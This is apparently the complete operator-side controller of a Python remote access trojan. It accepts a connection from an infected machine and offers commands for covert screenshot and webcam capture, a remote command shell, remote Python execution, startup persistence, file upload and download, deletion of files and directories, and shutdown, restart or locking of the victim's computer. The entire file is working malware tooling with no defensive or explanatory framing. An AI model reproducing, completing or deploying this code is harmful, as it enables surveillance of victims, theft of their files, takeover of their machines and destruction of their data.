import socket, os, time, re

# Socket Properties
HOST = "0.0.0.0"
PORT = 3000

# Defines (Send & Recv) Functions for use
send = lambda data: conn.send(data)
recv = lambda buffer: conn.recv(buffer)

os.system("clear" if os.name == "posix" else "cls")

def main():
    global conn, ClientInfo

    try:
        objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except (socket.error, Exception) as e:
        print(f"[1] Error: ({e})"); exit(1)

    try:
        print(f"Listening on Port: ({PORT})\n" + "-"*25)
        objSocket.bind((HOST, PORT)); objSocket.listen(socket.SOMAXCONN)
    except (socket.error, Exception) as e2:
        print(f"[2] Error: ({e2})"); exit(1)

    while (True):
        try:
            conn, address = objSocket.accept()
            ClientInfo = recv(1024).decode().split()

            print(f"Computer Connected: ({ClientInfo[0]}) ({ClientInfo[1]})\n")
            return

        except (socket.error, Exception) as e3:
            print(f"[3] Error: ({e3})"); exit(1)

def UsableCommands():
    print("_______________________________________")
    print("(Connection Commands)                  |\n" + \
          "                                       |")
    print("[-tc] Terminate Connection             |")
    print("[-ac] Append Connection to Background  |")
    print("_______________________________________|")
    print("(User Interface Commands)              |\n" + \
          "                                       |")
    print("[-sm] Send Message (VBS-Box)           |")
    print("[-ow] Open Webpage                     |")
    print("[-ss] Capture Screenshot               |")
    print("[-cw] Capture Webcam                   |")
    print("_______________________________________|")
    print("(System Commands)                      |\n" + \
          "                                       |")
    print("[-si] View System Information          |")
    print("[-sp] Start Process on Remote Machine  |")
    print("[-pi] Remote Python Interpreter        |")
    print("[-rs] Remote CMD Shell                 |")
    print("[-su] Register to Startup              |")
    print("[-ru] Remove from Startup              |")
    print("[-sc] Shutdown Computer                |")
    print("[-rc] Restart Computer                 |")
    print("[-lc] Lock Computer                    |")
    print("_______________________________________|")
    print("(File Commands)                        |\n" + \
          "                                       |")
    print("[-cd] Get Current Directory            |")
    print("[-vf] View Files                       |")
    print("[-sf] Send File                        |")
    print("[-rf] Receive File                     |")
    print("[-dl] Delete File/Directory            |")
    print("_______________________________________|\n")

def OpenWebpage(pattern="((https?):((//)|(\\\\))+([\w\d:#@%/;$()~_?\+-=\\\.&](#!)?)*)"):
    url = input("\nWebpage URL: ")
    if not (re.match(pattern, url)):
        print("[Bad URL, use: http/https]\n")
        return

    send(b"open-webpage"); time.sleep(0.2); send(url.encode())
    print(recv(1024).decode() + "\n")

def Screenshot():
    if not (recv(1024).decode() == "success"):
        print("(Error Capturing Screen)\n")
        return

    bytesize = recv(1024).decode()
    with open("screenshot.png", "wb") as ImageFile:
        ImageFile.write(recv(int(bytesize)))

    print("\n(Screenshot Captured)\n" + f"Total Size: {str(bytesize)}\n")

def Webcam():
    if not (recv(1024).decode() == "success"):
        print("(No Webcam Detected)\n")
        return

    bytesize = recv(1024).decode()
    with open("webcam.png", "wb") as ImageFile:
        ImageFile.write(recv(int(bytesize)))

    print("\n(Screenshot Captured)\n" + f"Total Size: {str(bytesize)}\n")

def SystemInformation():
    print(f"\nComputer: ({ClientInfo[1]})")
    print(f"Username: ({ClientInfo[2]})")
    print(f"IP Address: ({ClientInfo[0]})")
    print(f"System: ({ClientInfo[3]} {ClientInfo[4]})")
    print(f"Public IP: ({ClientInfo[5]})\n")

def StartProcess():
    FileLocation = input("\nRemote File Location (C:/.../file.exe): "); send(FileLocation.encode()); ClientResponse = recv(1024).decode()
    if not (ClientResponse == "VALID"):
        print("(Non-Existing File)\n")
        return

    print(f"Status: (Process Running)\n")

def PythonInterpreter():
    with open("code.txt", "w") as CodeFile:
        CodeFile.close()

    if (os.name == "posix"):
        os.system("xdg-open " + "code.txt")
    else:
        os.system("start " + "code.txt")

    UserOption = input("\nExecute Code on Remote Machine? (y/n): ").lower()
    if not (UserOption == "y"):
        send(b"not-sending"); print("Returning...\n"); os.remove("code.txt")
        return

    with open("code.txt", "rb") as SendCodeFile:
        send(SendCodeFile.read())

    ClientResponse = recv(1024).decode()
    if not (ClientResponse == "SUCCESS"):
        print(ClientResponse + "\n"); os.remove("code.txt")
        return

    ClientOutput = recv(1024).decode(); SplitOutput = ClientOutput.split("<")
    if (SplitOutput[0] == ""):
        print("\n[Remote Machine Output]\n" + "-"*23 + "\n<No Output>\n")
    else:
        print("\n[Remote Machine Output]\n" + "-"*23 + f"\n{SplitOutput[0]}")
    os.remove("code.txt")

def RemoteCMD():
    CurrentRemoteDirectory = recv(1024).decode()
    print("(Remote CMD Active)\n\n", end="")

    while (True):
        CMD_Command = input("[ " + CurrentRemoteDirectory + " ]> ").lower()
        if (CMD_Command == "exit" or CMD_Command == "quit"):
            send(b"close-cmd"); print("(Exited CMD)\n")
            break

        elif (CMD_Command == "cls" or CMD_Command == "clear"):
            os.system("clear" if os.name == "posix" else "cls")

        elif (CMD_Command == "cmd"):
            print("Currently in CMD\n\n", end="")

        elif (len(CMD_Command) > 0):
            send(CMD_Command.encode())
            print(recv(4096).decode(), end="")
        else:
            print(CurrentRemoteDirectory, end="")

def ViewFiles():
    print(f"Available Drives: ({recv(1024).decode()})\n")
    RemoteDirectory = input("Remote Directory: "); send(RemoteDirectory.encode()); ClientResponse = recv(1024).decode()
    if not (ClientResponse == "VALID"):
        print("(Non-Existing Directory)\n")
        return

    Number_Of_Files = recv(1024).decode(); time.sleep(0.2); files = recv(45000).decode()
    print(f"Files - [{Number_Of_Files}]\n"); print(files + "\n")

def SendFile():
    FilePath = input("\nFile Path (C:/.../file.exe): ")
    if not (os.path.isfile(FilePath)):
        print("(Non-Existent File)\n")
        return

    send(b"send-file")
    basename = os.path.basename(FilePath); bytesize = str(os.path.getsize(FilePath))
    send(basename.encode()); time.sleep(0.2); send(bytesize.encode())

    with open(FilePath, "rb") as file:
        send(file.read())

    print(recv(1024).decode() + "\n")

def ReceiveFile():
    RemoteFile = input("\nRemote File (C:/.../file.exe): "); send(RemoteFile.encode()); ClientResponse = recv(1024).decode()
    if not (ClientResponse == "success"):
        print("(Non-Existent File)\n")
        return

    basename = recv(1024).decode(); bytesize = recv(1024).decode()
    with open(basename, "wb") as file:
        file.write(recv(int(bytesize)))

    print("(File Received)\n")

def Delete():
    choice = input("\nDelete File/Directory? (f/d): ").lower()
    if (choice == "f"):
        send(b"del-file"); file = input("Remote File (C:/.../file.exe): "); send(file.encode()); ClientResponse = recv(1024).decode()
        if not (ClientResponse == "success"):
            print("(Non-Existent File)\n")
            return

        print("(File Deleted)\n")

    elif (choice == "d"):
        send(b"del-dir"); directory = input("Remote Directory: "); input("[Enter to Delete]"); send(directory.encode()); ClientResponse = recv(1024).decode()
        if not (ClientResponse == "success"):
            print("(Non-Existent Directory)\n")
            return

        print("(Directory Deleted)\n")

    else:
        send(b"error"); print("Invalid Choice, Returning...\n")

def RemoteCommands():
    while (True):
        try:
            command = input(f"({ClientInfo[0]})> ").lower().strip()
            if (command == "help" or command == "?"):
                UsableCommands()
            elif (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")
            elif (command == "-tc"):
                send(b"close-connection"); print(f"Terminated Connection: ({ClientInfo[0]})\n"); conn.close(); break
            elif (command == "-ac"):
                send(b"append-connection"); print(f"Appended Connection: ({ClientInfo[0]})\n"); conn.close(); break
            elif (command == "-sm"):
                message = input("\nType Message: "); send(b"message-box"); send(message.encode()); print(recv(1024).decode() + "\n")
            elif (command == "-ow"):
                OpenWebpage()
            elif (command == "-ss"):
                send(b"capture-screenshot"); Screenshot()
            elif (command == "-cw"):
                send(b"capture-webcam"); Webcam()
            elif (command == "-si"):
                send(b"test"); SystemInformation()
            elif (command == "-sp"):
                send(b"start-process"); StartProcess()
            elif (command == "-pi"):
                send(b"python-interpreter"); PythonInterpreter()
            elif (command == "-rs"):
                send(b"remote-cmd"); RemoteCMD()
            elif (command == "-su"):
                send(b"startup"); print(recv(1024).decode() + "\n")
            elif (command == "-ru"):
                send(b"rmv-startup"); print(recv(1024).decode() + "\n")
            elif (command == "-sc"):
                send(b"shutdown-pc"); print(f"Status: ({recv(1024).decode()})\n")
            elif (command == "-rc"):
                send(b"restart-pc"); print(f"Status: ({recv(1024).decode()})\n")
            elif (command == "-lc"):
                send(b"lock-pc"); print(f"Status: ({recv(1024).decode()})\n")
            elif (command == "-cd"):
                send(b"current-dir"); print(recv(1024).decode() + "\n")
            elif (command == "-vf"):
                send(b"view-files"); ViewFiles()
            elif (command == "-sf"):
                SendFile()
            elif (command == "-rf"):
                send(b"receive-file"); ReceiveFile()
            elif (command == "-dl"):
                send(b"delete"); Delete()
            else:
                print(f"Unrecognized Command: ({command})\n")

        except KeyboardInterrupt:
            send(b"append-connection"); print("\n(Keyboard Interrupted, Connection Appended)\n"); exit(0)

        except (socket.error, Exception) as e:
            print(f"\n[-] Lost Connection to ({ClientInfo[0]})\n" + f"Error Message: {e}\n"); exit(1)

main(); RemoteCommands()
